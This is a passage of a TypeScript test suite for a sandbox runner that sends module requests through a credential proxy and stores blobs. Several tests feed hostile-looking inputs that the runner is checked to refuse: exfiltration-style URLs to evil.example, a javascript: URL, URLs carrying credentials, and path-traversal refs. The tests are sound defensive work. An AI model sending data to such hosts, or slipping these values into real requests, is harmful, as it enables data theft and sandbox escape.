  it("hides every GRAFT_* variable the runner consumed, at import time and at call time", async () => {
    const resultPath = join(fixtures, "results", "env.result.json");
    const run = await runRunner({
      module: fixture("envAtImport.mjs"),
      env: {
        ...dry(),
        GRAFT_RESULT_PATH: resultPath,
        GRAFT_TIMEOUT_MS: "5000",
        GRAFT_AGENT: "agent_1",
        GRAFT_TOOL_VERSION: "ver_1",
        GRAFT_BLOBS_DIR: join(fixtures, "blobs-env"),
      },
    });

    expect(run.code).toBe(0);
    expect(run.stderr).toBe("");
    // The variables still did their work before they went: this was a dry run, written to the file.
    expect(run.stdout).toBe(`${RESULT_MARKER}${resultPath}\n`);
    const report = (await writtenEnvelope(resultPath)).result as DryRunReport;
    expect(report.dryRun).toBe(true);
    expect(report.moduleResult).toEqual({ atImport: [], atCall: [] });
  });
});

describe("ctx.fetch", () => {
  it("prepends the proxy URL and connection to a vendor-relative path and adds the bearer token", async () => {
    const before = received.length;
    const run = await runRunner({
      module: fixture("fetches.mjs"),
      stdin: '{"orderId": 7}',
      env: bound(),
    });

    expect(run.code).toBe(0);
    expect(resultOf(run)).toEqual({
      status: 200,
      body: { path: "/c/conn_1/v1/orders?x=1" },
      connection: "conn_1",
    });
    const request = received[before];
    expect(request?.method).toBe("POST");
    expect(request?.url).toBe("/c/conn_1/v1/orders?x=1");
    expect(request?.headers.authorization).toBe("Bearer tok_secret_123");
    expect(request?.headers["content-type"]).toBe("application/json");
    expect(request?.body).toBe('{"orderId":7}');
  });

  /** The proxy returned the redirect on purpose; the sandbox can reach nothing but the proxy. */
  it("does not follow a redirect: the proxy's 303 reaches the module as a status, and no second request is made", async () => {
    const before = received.length;
    const run = await runRunner({ module: fixture("redirected.mjs"), env: bound() });

    expect(run.code).toBe(0);
    expect(resultOf(run)).toEqual({
      status: 303,
      location: "https://elsewhere.example/moved",
    });
    expect(received.length).toBe(before + 1);
    expect(received[before]?.url).toBe("/c/conn_1/redirected");
  });

  /**
   * GRA-197 (ADR 0010 as amended 2026-09-23): an absolute `https://` URL is the proxy's host form for
   * its host, the route `ctx.proxyBase(host)` names, with the path and the query as given. The token
   * still travels to the proxy and nowhere else; whether the host is the connection's is the proxy's
   * judgement, which the fake here does not make.
   */
  it("routes an absolute https URL to /h/<host>/ with the path and query kept, the bearer and no redirect following", async () => {
    const before = received.length;
    const run = await runRunner({
      module: fixture("absolute.mjs"),
      stdin: JSON.stringify({
        url: "https://Files.Slack.com/upload/v1/abc?x=1&y=two#frag",
        init: { method: "POST", headers: { "content-type": "text/plain" }, body: "the bytes" },
      }),
      env: bound(),
    });

    expect(run.code).toBe(0);
    expect(resultOf(run)).toEqual({
      status: 200,
      location: null,
      body: { path: "/c/conn_1/h/files.slack.com/upload/v1/abc?x=1&y=two" },
    });
    const request = received[before];
    expect(received).toHaveLength(before + 1);
    expect(request?.method).toBe("POST");
    expect(request?.url).toBe("/c/conn_1/h/files.slack.com/upload/v1/abc?x=1&y=two");
    expect(request?.headers.authorization).toBe("Bearer tok_secret_123");
    expect(request?.headers["content-type"]).toBe("text/plain");
    expect(request?.body).toBe("the bytes");
  });

  it("keeps a port in the host segment, and a URL with no path lands on the host's root", async () => {
    const before = received.length;
    const run = await runRunner({
      module: fixture("absolute.mjs"),
      stdin: JSON.stringify({ url: "https://graph.microsoft.com:8443" }),
      env: bound(),
    });

    expect(resultOf(run)).toMatchObject({ status: 200 });
    expect(received[before]?.url).toBe("/c/conn_1/h/graph.microsoft.com:8443/");
  });

  it("hands a 303 on the host route back unfollowed, as on the plain one", async () => {
    const before = received.length;
    const run = await runRunner({
      module: fixture("absolute.mjs"),
      stdin: JSON.stringify({ url: "https://files.example.com/redirected" }),
      env: bound(),
    });

    expect(resultOf(run)).toEqual({
      status: 303,
      location: "https://elsewhere.example/moved",
      body: null,
    });
    expect(received).toHaveLength(before + 1);
    expect(received[before]?.url).toBe("/c/conn_1/h/files.example.com/redirected");
  });

  /** The token must never travel over anything but https to the proxy's host form. */
  it("refuses a URL that is not https without making a request, and names the scheme", async () => {
    const before = received.length;
    const run = await runRunner({
      module: fixture("escapes.mjs"),
      stdin: JSON.stringify({ path: "http://evil.example/collect" }),
      env: bound(),
    });

    expect(run.code).toBe(0);
    expect(resultOf(run)).toEqual({
      refused:
        'ctx.fetch takes an https:// URL on one of the connection\'s hosts, or a vendor-relative path such as "/v1/orders", not http:// (http://evil.example/collect).',
    });
    expect(received).toHaveLength(before);
  });

  /** The sentence names the target less its query, so a signature in it is repeated nowhere (Greptile on #156). */
  it("names a refused URL without its query", async () => {
    const run = await runRunner({
      module: fixture("escapes.mjs"),
      stdin: JSON.stringify({ path: "http://evil.example/collect?X-Amz-Signature=secret123" }),
      env: bound(),
    });

    const result = resultOf(run) as { refused: string };
    expect(result.refused).toContain("not http:// (http://evil.example/collect?…).");
    expect(result.refused).not.toContain("secret123");
  });

  /** Nor its fragment, nor anything past the scheme of a URL that does not parse (Greptile on #156, third pass). */
  it.each([
    ["http://evil.example/collect#token=secret123", "not http:// (http://evil.example/collect)."],
    [
      "http://evil.example/collect?sig=secret123#token=secret123",
      "not http:// (http://evil.example/collect?…).",
    ],
    ["mailto:secret123@evil.example", "not mailto:// (mailto:…)."],
    ["https://exa mple.com/x?token=secret123#secret123", "could not parse: https:…"],
  ])("names %s in a refusal without its query or fragment", async (url, sentence) => {
    const run = await runRunner({
      module: fixture("escapes.mjs"),
      stdin: JSON.stringify({ path: url }),
      env: bound(),
    });

    const result = resultOf(run) as { refused: string };
    expect(result.refused).toContain(sentence);
    expect(result.refused).not.toContain("secret123");
  });

  it.each(["ftp://files.example.com/x", "mailto:a@b.example", "javascript:alert(1)"])(
    "refuses %s as not https",
    async (url) => {
      const before = received.length;
      const run = await runRunner({
        module: fixture("escapes.mjs"),
        stdin: JSON.stringify({ path: url }),
        env: bound(),
      });

      expect(resultOf(run)).toEqual({
        refused: expect.stringContaining("takes an https:// URL"),
      });
      expect(received).toHaveLength(before);
    },
  );

  /** A module never holds a credential, so a URL carrying one is refused, and the sentence repeats none of it. */
  it("refuses a URL carrying credentials without making a request, naming the host and not the secret", async () => {
    const before = received.length;
    const run = await runRunner({
      module: fixture("escapes.mjs"),
      stdin: JSON.stringify({ path: "https://alice:hunter2@files.example.com/upload" }),
      env: bound(),
    });

    const result = resultOf(run) as { refused: string };
    expect(result.refused).toBe(
      "ctx.fetch refused a URL carrying credentials for files.example.com: the proxy supplies the connection's credential, and a module never holds one.",
    );
    expect(result.refused).not.toContain("hunter2");
    expect(result.refused).not.toContain("alice");
    expect(received).toHaveLength(before);
  });

  /** A host is a path segment on the proxy; anything that is not a host name is refused before it becomes one. */
  it.each(["https://[::1]/x", "https://-x.example/x", "https://x_y.example/x"])(
    "refuses %s as a host that is not a host name",
    async (url) => {
      const before = received.length;
      const run = await runRunner({
        module: fixture("escapes.mjs"),
        stdin: JSON.stringify({ path: url }),
        env: bound(),
      });

      expect(resultOf(run)).toEqual({
        refused: expect.stringContaining("ctx.fetch refused a URL whose host is not a host name"),
      });
      expect(received).toHaveLength(before);
    },
  );

  /** Nor for a connection the token was not minted for. */
  it("refuses a path that climbs out of the connection", async () => {
    const before = received.length;
    const run = await runRunner({
      module: fixture("escapes.mjs"),
      stdin: JSON.stringify({ path: "../conn_2/v1/orders" }),
      env: bound(),
    });

    expect(resultOf(run)).toEqual({
      refused: expect.stringContaining("leaves the connection"),
    });
    expect(received).toHaveLength(before);
  });

  /** A plain command carries no connection; a module that reaches for one is told so. */
  it("throws a clear error when no connection is bound", async () => {
    const run = await runRunner({
      module: fixture("escapes.mjs"),
      stdin: JSON.stringify({ path: "/v1/orders" }),
    });

    expect(run.code).toBe(0);
    expect(resultOf(run)).toEqual({
      refused: expect.stringContaining("no connection bound"),
    });
  });
});

/**
 * `ctx.proxyBase(host?)` — ADR 0010. The primary form is the prefix `ctx.fetch` builds under; the
 * `/h/<host>` form is the proxy's multi-host route for a host the connection declares. The runner
 * only builds the address: which hosts are allowed is the proxy's to decide.
 */
describe("ctx.proxyBase", () => {
  it("returns the connection's base without a host and the /h/ form with one, on a frozen ctx", async () => {
    const run = await runRunner({
      module: fixture("proxyBase.mjs"),
      stdin: JSON.stringify({ host: "api.example.com" }),
      env: bound(),
    });

    expect(run.code).toBe(0);
    expect(resultOf(run)).toEqual({
      primary: `${proxyUrl}/c/conn_1`,
      host: `${proxyUrl}/c/conn_1/h/api.example.com`,
      frozen: true,
    });
  });

  it("tolerates a proxy URL with a path and a trailing slash", async () => {
    const run = await runRunner({
      module: fixture("proxyBase.mjs"),
      stdin: JSON.stringify({ host: "graph.microsoft.com:443" }),
      env: { ...bound(), GRAFT_PROXY_URL: `${proxyUrl}/api/proxy/` },
    });

    expect(resultOf(run)).toEqual({
      primary: `${proxyUrl}/api/proxy/c/conn_1`,
      host: `${proxyUrl}/api/proxy/c/conn_1/h/graph.microsoft.com:443`,
      frozen: true,
    });
  });

  /** A host is a path segment on the proxy; anything that could be a path is refused before it becomes one. */
  it.each(["api.example.com/../../other", "https://api.example.com", "a b", "", "-x.example"])(
    "refuses %j as a host",
    async (host) => {
      const run = await runRunner({
        module: fixture("proxyBase.mjs"),
        stdin: JSON.stringify({ host }),
        env: bound(),
      });

      expect(resultOf(run)).toEqual({
        refused: expect.stringContaining("ctx.proxyBase takes a host name"),
      });
    },
  );

  it("is unavailable when no connection is bound, in the same words as ctx.fetch", async () => {
    const run = await runRunner({
      module: fixture("proxyBase.mjs"),
      stdin: JSON.stringify({ host: "api.example.com" }),
    });

    expect(resultOf(run)).toEqual({
      refused: expect.stringContaining("ctx.proxyBase is unavailable"),
    });
  });

  /** What an SDK does with the two: the request lands on the proxy, under the host segment, with the token. */
  it("carries an SDK's request to the proxy under /h/<host> with proxyKey as the bearer", async () => {
    const before = received.length;
    const run = await runRunner({ module: fixture("sdk.mjs"), env: bound() });

    expect(run.code).toBe(0);
    expect(resultOf(run)).toEqual({
      status: 200,
      body: { path: "/c/conn_1/h/api.example.com/v2/things" },
    });
    const request = received[before];
    expect(request?.url).toBe("/c/conn_1/h/api.example.com/v2/things");
    expect(request?.headers.authorization).toBe("Bearer tok_secret_123");
  });
});

/** The seeding side reads the same file this suite spawns. */
it("is the file provisioning seeds", () => {
  expect(RUNNER_SOURCE_PATH).toBe(RUNNER);
});

/**
 * The detached path. With `GRAFT_RESULT_PATH` set the result goes to a file the caller reads once the
 * process record says it has finished, and stdout says only where it went.
 */
describe("GRAFT_RESULT_PATH", () => {
  it("writes the result to the file whole, prints only the marker on stdout, and leaves no temporary file", async () => {
    const resultPath = join(fixtures, "results", "nested", "cmd-abc.result.json");

    const run = await runRunner({
      module: fixture("echo.mjs"),
      stdin: '{"n": 1}',
      env: { GRAFT_RESULT_PATH: resultPath },
    });

    expect(run.code).toBe(0);
    expect(run.stderr).toBe("");
    expect(run.stdout).toBe(`${RESULT_MARKER}${resultPath}\n`);
    expect(await writtenEnvelope(resultPath)).toEqual({ result: { echoed: { n: 1 } }, blobs: [] });
    await expect(stat(`${resultPath}.tmp`)).rejects.toThrow();
  });

  it("writes no result file when the module throws, and fails as before", async () => {
    const resultPath = join(fixtures, "throws.result.json");

    const run = await runRunner({
      module: fixture("throws.mjs"),
      env: { GRAFT_RESULT_PATH: resultPath },
    });

    expect(run.code).toBe(1);
    expect(run.stdout).toBe("");
    expect(run.stderr).toContain("kaboom");
    await expect(stat(resultPath)).rejects.toThrow();
  });
});

/**
 * Dry-run mode. `GRAFT_DRY_RUN=1` with a token the proxy reads the claim off: reads pass through to
 * the fake and come back real, a write comes back as the proxy's preview and the module runs on
 * against it, and what stdout carries is the report — verified apart from unverified, and `passed`
 * decided on the preview rather than on what the module did after it.
 */
describe("GRAFT_DRY_RUN", () => {
  const report = (run: Run): DryRunReport => resultOf(run) as DryRunReport;

  it("passes a read-only module on its real responses, with nothing unverified", async () => {
    const run = await runRunner({ module: fixture("dryReadOnly.mjs"), env: dry() });

    expect(run.code).toBe(0);
    expect(run.stderr).toBe("");
    expect(report(run)).toEqual({
      dryRun: true,
      passed: true,
      reads: [{ method: "GET", path: "/items?limit=2", status: 200 }],
      writesPreviewed: [],
      writesRefused: [],
      moduleResult: { status: 200, items: { path: "/c/conn_1/items?limit=2", items: ["a", "b"] } },
      verified: { reads: true, writeRequests: true },
      unverified: [],
    });
  });

  it("hands the module the proxy's preview as the response, records it, and marks post-write handling unverified", async () => {
    const before = received.length;
    const run = await runRunner({
      module: fixture("dryWrite.mjs"),
      stdin: '{"itemId":"itm_a","quantity":2}',
      env: dry(),
    });

    expect(run.code).toBe(0);
    const result = report(run);
    expect(result.passed).toBe(true);
    expect(result.reads).toEqual([{ method: "GET", path: "/items", status: 200 }]);
    // The proxy's own account of the write: header names, never values; the body as it would have left.
    expect(result.writesPreviewed).toEqual([
      {
        method: "POST",
        path: "/orders",
        headerNames: expect.arrayContaining(["content-type", "x-idempotency"]),
        body: '{"itemId":"itm_a","quantity":2}',
      },
    ]);
    expect(result.writesPreviewed[0]?.headerNames).not.toContain("authorization");
    expect(result.writesRefused).toEqual([]);
    // The module saw exactly what the proxy answered — the 202 and the preview body — unchanged.
    expect(result.moduleResult).toMatchObject({
      read: 200,
      write: 202,
      answer: { dryRun: true, intercepted: true, request: { method: "POST", path: "/orders" } },
    });
    expect(result.verified).toEqual({ reads: true, writeRequests: true });
    expect(result.unverified).toEqual(["post-write handling"]);
    // The write reached the proxy — and the proxy, not the vendor, answered it.
    const write = received.slice(before).find((request) => request.method === "POST");
    expect(write?.url).toBe("/c/conn_1/orders");
    expect(write?.headers.authorization).toBe(`Bearer ${DRY_TOKEN}`);
  });

  /** A module that throws *after* the intercepted write still passes on the preview. */
  it("still passes a module that throws after an intercepted write, reporting the error unverified", async () => {
    const run = await runRunner({
      module: fixture("dryWriteThrows.mjs"),
      stdin: '{"itemId":"itm_a"}',
      env: dry(),
    });

    expect(run.code).toBe(0);
    expect(run.stderr).toBe("");
    const result = report(run);
    expect(result.passed).toBe(true);
    expect(result.writesPreviewed).toHaveLength(1);
    expect(result.moduleError).toContain("the vendor returned no order id");
    expect(result).not.toHaveProperty("moduleResult");
    expect(result.unverified).toEqual(["post-write handling"]);
  });

  /** A throw with no write intercepted is the module failing on its own, and the report says so. */
  it("fails a module that throws before any write, and exits 0 with the report", async () => {
    const run = await runRunner({ module: fixture("dryThrowsFirst.mjs"), env: dry() });

    expect(run.code).toBe(0);
    const result = report(run);
    expect(result.passed).toBe(false);
    expect(result.moduleError).toContain("input.lines is undefined");
    expect(result.reads).toEqual([]);
    expect(result.writesPreviewed).toEqual([]);
    expect(result.unverified).toEqual([]);
  });

  it("fails on a read the vendor refused, and says which", async () => {
    const run = await runRunner({ module: fixture("dryReadFails.mjs"), env: dry() });

    const result = report(run);
    expect(result.passed).toBe(false);
    expect(result.reads).toEqual([{ method: "GET", path: "/missing", status: 404 }]);
    expect(result.verified).toEqual({ reads: false, writeRequests: true });
    expect(result.moduleResult).toEqual({ status: 404 });
  });

  /** The proxy's mark tells a read the network refused from one the vendor answered (GRA-79). */
  it("records the proxy's reason, code and host on a read it could not make, and hands the module the body whole", async () => {
    const run = await runRunner({ module: fixture("dryReadUnreachable.mjs"), env: dry() });

    const result = report(run);
    expect(result.passed).toBe(false);
    expect(result.reads).toEqual([
      {
        method: "GET",
        path: "/unreachable",
        status: 502,
        reason: "upstream_unreachable",
        code: "ENOTFOUND",
        host: "api.vendor.example",
      },
    ]);
    // The clone the record was read from left the module's own body intact.
    expect(result.moduleResult).toEqual({
      status: 502,
      body: expect.objectContaining({ reason: "upstream_unreachable", code: "ENOTFOUND" }),
    });
  });

  it("records a vendor's own 502 as a status alone, with no reason", async () => {
    const run = await runRunner({ module: fixture("dryReadVendorDown.mjs"), env: dry() });

    const result = report(run);
    expect(result.passed).toBe(false);
    expect(result.reads).toEqual([{ method: "GET", path: "/vendor-down", status: 502 }]);
    expect(result.reads[0]).not.toHaveProperty("reason");
  });

  it("records a redirected read with its status rather than a thrown run", async () => {
    const run = await runRunner({ module: fixture("redirected.mjs"), env: dry() });

    const result = report(run);
    expect(result.passed).toBe(false);
    expect(result.reads).toEqual([{ method: "GET", path: "/redirected", status: 303 }]);
    expect(result.moduleResult).toEqual({
      status: 303,
      location: "https://elsewhere.example/moved",
    });
  });

  /** A write that never became a preview — refused by `ctx.fetch` or by the proxy — is a write request that was not well-formed. */
  it("fails on a write refused before or at the proxy, recording both kinds", async () => {
    const run = await runRunner({
      module: fixture("dryWriteRefused.mjs"),
      env: dry(DRY_REFUSING_TOKEN),
    });

    const result = report(run);
    expect(result.passed).toBe(false);
    expect(result.writesRefused).toEqual([
      {
        method: "POST",
        // The query dropped and marked, so the signature it carried is on no record (Greptile on #156).
        path: "http://evil.example/collect?…",
        status: null,
        error: expect.stringContaining("not http:// (http://evil.example/collect?…)"),
      },
      { method: "DELETE", path: "/orders", status: 403, error: null },
    ]);
    expect(JSON.stringify(result)).not.toContain("secret123");
    expect(result.writesPreviewed).toEqual([]);
    expect(result.verified).toEqual({ reads: true, writeRequests: false });
    expect(result.unverified).toEqual([]);
  });

  /**
   * GRA-197: a call on the host route is on the report as scheme, host and path, so the host is
   * named, with the query dropped and marked `?…` so a signature it carried is not (Greptile on
   * #156, twice).
   */
  it("records a read and a previewed write on an absolute URL by scheme, host and path, the query marked and dropped", async () => {
    const before = received.length;
    const run = await runRunner({ module: fixture("dryAbsolute.mjs"), env: dry() });

    const result = report(run);
    expect(result.passed).toBe(true);
    expect(result.reads).toEqual([
      { method: "GET", path: "https://files.example.com/upload-url", status: 200 },
    ]);
    expect(result.writesPreviewed).toEqual([
      {
        method: "POST",
        // The URL the module gave less its query, not the preview's vendor path, so the host is on
        // the record as it is for the read above and the query's values are not (Greptile on #156).
        path: "https://files.example.com/upload/v1/abc?…",
        headerNames: expect.arrayContaining(["content-type"]),
        body: "the bytes",
      },
    ]);
    expect(result.writesRefused).toEqual([]);
    expect(result.moduleResult).toEqual({ read: 200, write: 202 });
    expect(JSON.stringify(result)).not.toContain("x=1");
    // The request itself carries the query whole: the record is what is trimmed, never the call.
    expect(received.slice(before).map((r) => r.url)).toEqual([
      "/c/conn_1/h/files.example.com/upload-url",
      "/c/conn_1/h/files.example.com/upload/v1/abc?x=1",
    ]);
  });

  /** Two writes to one path on two declared hosts are two entries, and the shape is the report's four fields. */
  it("keeps two previewed writes to the same path on two hosts apart, each by its own host, with both queries dropped", async () => {
    const before = received.length;
    const run = await runRunner({ module: fixture("dryTwoHosts.mjs"), env: dry() });

    const result = report(run);
    expect(result.passed).toBe(true);
    expect(result.moduleResult).toEqual({ first: 202, second: 202 });
    expect(result.writesPreviewed).toEqual([
      {
        method: "POST",
        path: "https://files.example.com/upload?…",
        headerNames: expect.arrayContaining(["content-type"]),
        body: "same",
      },
      {
        method: "POST",
        path: "https://other.example.com/upload?…",
        headerNames: expect.arrayContaining(["content-type"]),
        body: "same",
      },
    ]);
    for (const entry of result.writesPreviewed) {
      expect(Object.keys(entry).sort()).toEqual(["body", "headerNames", "method", "path"]);
    }
    expect(new Set(result.writesPreviewed.map((entry) => entry.path)).size).toBe(2);
    expect(JSON.stringify(result)).not.toContain("secret");
    expect(received.slice(before).map((r) => r.url)).toEqual([
      "/c/conn_1/h/files.example.com/upload?sig=first-secret",
      "/c/conn_1/h/other.example.com/upload?sig=second-secret",
    ]);
  });

  /** A presigned URL's signature is in its query, and the report carries none of it, on a read or a write. */
  it("records a presigned read and write without the X-Amz-Signature their queries carried", async () => {
    const run = await runRunner({ module: fixture("dryPresigned.mjs"), env: dry() });

    const result = report(run);
    expect(result.passed).toBe(true);
    expect(result.moduleResult).toEqual({ read: 200, write: 202 });
    expect(result.reads).toEqual([
      { method: "GET", path: "https://files.example.com/report.pdf?…", status: 200 },
    ]);
    expect(result.writesPreviewed).toEqual([
      {
        method: "PUT",
        path: "https://uploads.example.com/put/object?…",
        headerNames: expect.any(Array),
        body: "the bytes",
      },
    ]);
    const text = JSON.stringify(result);
    for (const secret of ["deadbeefcafe0123", "feedface9876", "X-Amz", "AWS4-HMAC-SHA256"]) {
      expect(text).not.toContain(secret);
    }
  });

  /** A fragment is dropped whether or not a query stands before it, and the query's marker is the only trace. */
  it("records a fragment-only read and a query-and-fragment write with neither on the report", async () => {
    const before = received.length;
    const run = await runRunner({ module: fixture("dryFragment.mjs"), env: dry() });

    const result = report(run);
    expect(result.passed).toBe(true);
    expect(result.moduleResult).toEqual({ read: 200, write: 202 });
    expect(result.reads).toEqual([
      { method: "GET", path: "https://files.example.com/download", status: 200 },
    ]);
    expect(result.writesPreviewed).toEqual([
      {
        method: "POST",
        path: "https://uploads.example.com/upload?…",
        headerNames: expect.any(Array),
        body: "the bytes",
      },
    ]);
    const text = JSON.stringify(result);
    for (const secret of ["fragment-secret", "query-secret", "token", "#"]) {
      expect(text).not.toContain(secret);
    }
    // The fragment never left the module either: fetch drops it, and the query went whole.
    expect(received.slice(before).map((r) => r.url)).toEqual([
      "/c/conn_1/h/files.example.com/download",
      "/c/conn_1/h/uploads.example.com/upload?sig=query-secret",
    ]);
  });

  it("writes the report to the result file on the detached path", async () => {
    const resultPath = join(fixtures, "results", "dry.result.json");
    const run = await runRunner({
      module: fixture("dryWrite.mjs"),
      stdin: '{"n":1}',
      env: { ...dry(), GRAFT_RESULT_PATH: resultPath },
    });

    expect(run.code).toBe(0);
    expect(run.stdout).toBe(`${RESULT_MARKER}${resultPath}\n`);
    const written = (await writtenEnvelope(resultPath)).result as DryRunReport;
    expect(written.dryRun).toBe(true);
    expect(written.passed).toBe(true);
    expect(written.writesPreviewed[0]?.body).toBe('{"n":1}');
  });

  /** Without the variable nothing changes: the same write reaches the fake as a plain call and the result is the module's. */
  it("is off without GRAFT_DRY_RUN, whatever the token", async () => {
    const run = await runRunner({
      module: fixture("dryWrite.mjs"),
      stdin: '{"n":1}',
      env: { ...bound(), GRAFT_TOKEN: DRY_TOKEN },
    });

    expect(run.code).toBe(0);
    const result = resultOf(run) as Record<string, unknown>;
    expect(result).not.toHaveProperty("dryRun");
    expect(result).toMatchObject({ read: 200, write: 202 });
  });
});

/**
 * `ctx.blob` (GRA-186; ADR 0023): a blob is a directory of `data` and `meta.json` under the blobs
 * directory, written whole by one rename, named by a `blob://<id>` ref, and every write is on the
 * ledger the envelope carries. The blobs directory is `GRAFT_BLOBS_DIR` here, a fresh temporary
 * directory per test, as it is the mapped `/blobs` under the fake sandbox and `/blobs` itself in
 * Docker.
 */
describe("ctx.blob", () => {
  const withBlobs = async (env: Record<string, string> = {}) => {
    const blobs = await mkdtemp(join(fixtures, "blobs-"));
    return {
      blobs,
      env: { GRAFT_BLOBS_DIR: blobs, GRAFT_AGENT: "agent_1", GRAFT_TOOL_VERSION: "ver_1", ...env },
    };
  };
  const REF = /^blob:\/\/[0-9a-f-]{36}$/;
  const idOf = (ref: string) => ref.slice(BLOB_REF_SCHEME.length);
  type Ledger = {
    ref: string;
    bytes: number;
    contentType: string;
    name?: string;
    expiresAt: string;
  }[];

  it("write lands data and meta.json under <id>/ by one rename, answers the ref, and the ledger and stat both say what the sidecar says", async () => {
    const { blobs, env } = await withBlobs();
    const before = Date.now();
    const run = await runRunner({
      module: fixture("writesBlob.mjs"),
      stdin: JSON.stringify({ text: "hello, blob", name: "hello.txt" }),
      env,
    });

    expect(run.code).toBe(0);
    expect(run.stderr).toBe("");
    const envelope = envelopeOf(run);
    const result = envelope.result as { file: string; stat: Record<string, unknown> };
    expect(result.file).toMatch(REF);
    const id = idOf(result.file);

    // The one directory, whole, and no `.tmp` beside it.
    expect(await readdir(blobs)).toEqual([id]);
    expect((await readdir(join(blobs, id))).sort()).toEqual(["data", "meta.json"]);
    expect(await readFile(join(blobs, id, "data"), "utf8")).toBe("hello, blob");
    const meta = JSON.parse(await readFile(join(blobs, id, "meta.json"), "utf8"));
    expect(meta).toEqual({
      bytes: 11,
      contentType: "text/plain",
      name: "hello.txt",
      writtenAt: expect.any(String),
      expiresAt: expect.any(String),
      agentId: "agent_1",
      toolVersion: "ver_1",
    });
    const writtenAt = Date.parse(meta.writtenAt);
    expect(writtenAt).toBeGreaterThanOrEqual(before - 1000);
    expect(Date.parse(meta.expiresAt) - writtenAt).toBe(BLOB_TTL_MS);

    // The ledger is the sidecar less what the server does not need, and stat is the same view.
    expect(envelope.blobs).toEqual([
      {
        ref: result.file,
        bytes: 11,
        contentType: "text/plain",
        name: "hello.txt",
        expiresAt: meta.expiresAt,
      },
    ]);
    expect(result.stat).toEqual({
      bytes: 11,
      contentType: "text/plain",
      name: "hello.txt",
      expiresAt: meta.expiresAt,
    });
  });

  it("writes from a Uint8Array, a Blob and a ReadableStream, reads one back as a Blob, and keeps the ledger in write order with name only where one was given", async () => {
    const { blobs, env } = await withBlobs();
    const run = await runRunner({ module: fixture("writesBlobKinds.mjs"), env });

    expect(run.code).toBe(0);
    expect(run.stderr).toBe("");
    const envelope = envelopeOf(run);
    const result = envelope.result as {
      bytes: string;
      blob: string;
      streamed: string;
      read: { size: number; type: string; text: string };
    };
    expect(result.read).toEqual({
      size: 13,
      type: "application/octet-stream",
      text: "from a stream",
    });
    expect(envelope.blobs as Ledger).toEqual([
      { ref: result.bytes, bytes: 10, contentType: "text/plain", expiresAt: expect.any(String) },
      {
        ref: result.blob,
        bytes: 11,
        contentType: "text/plain",
        name: "blob.txt",
        expiresAt: expect.any(String),
      },
      {
        ref: result.streamed,
        bytes: 13,
        contentType: "application/octet-stream",
        expiresAt: expect.any(String),
      },
    ]);
    expect((await readdir(blobs)).sort()).toEqual(
      [result.bytes, result.blob, result.streamed].map(idOf).sort(),
    );
    expect(await readFile(join(blobs, idOf(result.blob), "data"), "utf8")).toBe("from a blob");
  });

  it("refuses blob_too_large mid-stream at 256 MiB, removes the .tmp directory, and puts nothing on the ledger", async () => {
    const { blobs, env } = await withBlobs();
    const run = await runRunner({ module: fixture("writesHugeBlob.mjs"), env });

    expect(run.code).toBe(0);
    const envelope = envelopeOf(run);
    expect(envelope.result).toEqual({
      code: "blob_too_large",
      refused: expect.stringMatching(
        /^blob_too_large: the blob passed 268435456 bytes \(256 MiB\)/,
      ),
    });
    expect(envelope.blobs).toEqual([]);
    expect(await readdir(blobs)).toEqual([]);
  }, 60_000);

  /** Every way a ref fails to resolve under `/blobs/<id>`, and the one answer (the header; GRA-187). */
  const DEAD_REFS = {
    missing: "blob://0f6b6c4e-6d4b-4a8b-9e6e-7c9d5b5f3a21",
    tmp: "blob://0f6b6c4e-6d4b-4a8b-9e6e-7c9d5b5f3a21.tmp",
    climbs: "blob://../etc",
    slash: "blob://a/b",
    empty: "blob://",
    notARef: "https://vendor.example/file.pdf",
  };

  it("stat answers blob_not_found, naming the ref, for an id that names nothing, a .tmp name, a climb, a slash, an empty id and a string that is not a ref", async () => {
    const { env } = await withBlobs();
    const run = await runRunner({
      module: fixture("blobRefs.mjs"),
      stdin: JSON.stringify(DEAD_REFS),
      env,
    });

    expect(run.code).toBe(0);
    const result = resultOf(run) as Record<string, { code: string | null; message: string }>;
    for (const [key, ref] of Object.entries(DEAD_REFS)) {
      expect(result[key]?.code, key).toBe("blob_not_found");
      expect(result[key]?.message, key).toContain(ref);
    }
    expect(result.missing?.message).toMatch(/names no blob this agent holds/);
    expect(result.notARef?.message).toMatch(/is not a blob ref .* takes the blob:\/\/<id> string/);
  });

  /**
   * The run's budget under the agent's quota (GRA-187, after Greptile on #145): what the door hands
   * the exec as GRAFT_BLOB_BUDGET_BYTES bounds the total this process commits, checked as the bytes
   * stream in; a refused write is on no disk and no ledger.
   */
  describe("GRAFT_BLOB_BUDGET_BYTES", () => {
    const MIB = 1024 * 1024;
    type Outcome = { ref?: string; code?: string | null; message?: string };
    const budget = (bytes: number) => ({
      GRAFT_BLOB_BUDGET_BYTES: String(bytes),
      GRAFT_BLOB_QUOTA_BYTES: String(1024 * MIB),
    });

    it("lets a run commit up to the budget and refuses the write that would pass it as blob_quota, naming the MiB left and the quota, with only the first on disk and on the ledger", async () => {
      const { blobs, env } = await withBlobs(budget(1.5 * MIB));
      const run = await runRunner({
        module: fixture("writesSizedBlobs.mjs"),
        stdin: JSON.stringify({ sizes: [1, 1] }),
        env,
      });

      expect(run.code).toBe(0);
      const envelope = envelopeOf(run);
      const [first, second] = envelope.result as Outcome[];
      expect(first?.ref).toMatch(REF);
      expect(second).toEqual({
        code: "blob_quota",
        message:
          "blob_quota: the blob would carry this run past the 0.5 MiB left of its budget: the agent's live blobs are at the 1024 MiB quota. A blob expires 24 hours after its write and stops counting then; write less, or run again once one has.",
      });
      expect((envelope.blobs as Ledger).map((line) => line.ref)).toEqual([first?.ref]);
      expect(await readdir(blobs)).toEqual([idOf(first?.ref ?? "")]);
    });

    it("stops one oversized write at the budget as the bytes stream in, and a budget of 0 refuses the first write", async () => {
      const oversized = await withBlobs(budget(1.5 * MIB));
      const one = await runRunner({
        module: fixture("writesSizedBlobs.mjs"),
        stdin: JSON.stringify({ sizes: [2] }),
        env: oversized.env,
      });
      expect(one.code).toBe(0);
      expect(envelopeOf(one).result).toEqual([
        { code: "blob_quota", message: expect.stringContaining("1.5 MiB left of its budget") },
      ]);
      expect(envelopeOf(one).blobs).toEqual([]);
      expect(await readdir(oversized.blobs)).toEqual([]);

      const none = await withBlobs(budget(0));
      const zero = await runRunner({
        module: fixture("writesSizedBlobs.mjs"),
        stdin: JSON.stringify({ sizes: [1] }),
        env: none.env,
      });
      expect(envelopeOf(zero).result).toEqual([
        { code: "blob_quota", message: expect.stringContaining("the 0 MiB left of its budget") },
      ]);
      expect(await readdir(none.blobs)).toEqual([]);
    });

    it("reserves as the bytes land, so of two 1 MiB writes started together under 1.5 MiB exactly one commits", async () => {
